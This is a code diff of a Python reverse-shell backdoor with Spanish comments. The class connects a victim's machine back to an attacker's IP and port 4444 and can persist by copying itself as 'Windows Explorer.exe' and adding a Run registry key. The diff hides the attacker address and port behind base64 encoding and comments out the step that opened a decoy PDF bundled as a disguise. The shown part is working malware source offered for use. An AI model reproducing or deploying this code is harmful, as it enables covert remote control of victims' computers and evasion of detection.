@@ -8,16 +8,21 @@ import sys
 
 class Backdoor:
     def __init__(self, ip, port):
+        d_ip = self.decode(ip)
+        d_port = self.decode(port)
         #self.becomePersistent()
         self.BUFFER_SIZE = 4096
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((bytes(ip, 'utf-8'), port)) #La víctima establece conexión con la computadora atacante
+        self.connection.connect((bytes(d_ip, 'utf-8'), int(d_port))) #La víctima establece conexión con la computadora atacante
 
     def becomePersistent(self):
         fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
         if not os.path.exists(fileLocation):
             shutil.copyfile(sys.executable, fileLocation)
             subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
+    
+    def decode(self, string):
+        return base64.b64decode(string.encode()).decode()
     
     #Codificación json:
     def reliableSend(self, data):
@@ -119,11 +124,11 @@ class Backdoor:
             self.connection.close()
             print('\nConexión finalizada')
             
-file_name = sys._MEIPASS + '\Historias_de_usuario.pdf'
-subprocess.Popen(file_name, shell= True)
+#file_name = sys._MEIPASS + '\Historias_de_usuario.pdf'
+#subprocess.Popen(file_name, shell= True)
 
 try: 
-    backdoor = Backdoor('192.168.1.14', 4444)
+    backdoor = Backdoor('MTkyLjE2OC4xLjE0', 'NDQ0NA==')
     backdoor.run()
 except:
     sys.exit()
